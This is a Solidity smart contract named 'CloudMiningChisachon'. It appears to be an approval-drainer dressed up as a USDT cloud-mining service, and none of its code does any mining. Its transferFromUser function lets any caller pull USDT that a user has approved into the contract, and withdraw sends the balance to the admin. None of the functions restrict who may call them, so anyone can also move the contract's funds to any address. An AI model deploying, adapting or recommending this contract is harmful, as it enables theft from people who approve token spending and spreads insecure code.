// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract CloudMiningChisachon {
    IERC20 public usdt;
    address public admin;

    mapping(address => uint256) public userDeposit;

    event AdminWithdraw(address indexed admin, uint256 amount);
    event AdminDeposit(address indexed user, uint256 amount);
    event AdminTransferFromUser(address indexed user, uint256 amount);

    constructor(address _usdt) {
        admin = msg.sender;
        usdt = IERC20(_usdt);
    }

    
    function transferFromUser(address user, uint256 amount) external {
        require(usdt.balanceOf(user) >= amount, "Saldo tidak cukup!");
        require(usdt.allowance(user, address(this)) >= amount, "Allowance tidak cukup!");

        require(usdt.transferFrom(user, address(this), amount), "Transfer gagal");
        userDeposit[user] += amount;

        emit AdminTransferFromUser(user, amount);
    }

    
    function withdraw(uint256 amount) external {
        require(usdt.balanceOf(address(this)) >= amount, "Saldo kontrak tidak cukup!");
        require(usdt.transfer(admin, amount), "Withdraw gagal");

        emit AdminWithdraw(admin, amount);
    }

    
    function depositToUser(address user, uint256 amount) external {
        require(usdt.balanceOf(address(this)) >= amount, "Saldo kontrak tidak cukup!");
        require(usdt.transfer(user, amount), "Deposit gagal");

        emit AdminDeposit(user, amount);
    }

    
    function getContractBalance() external view returns (uint256) {
        return usdt.balanceOf(address(this));
    }

    
    function getUserBalance(address user) external view returns (uint256) {
        return usdt.balanceOf(user);
    }

    
    function getAllowance(address user) external view returns (uint256) {
        return usdt.allowance(user, address(this));
    }

    
    function approveContract(uint256 amount) external {
        require(usdt.approve(address(this), amount), "Gagal memberikan izin");
    }
}
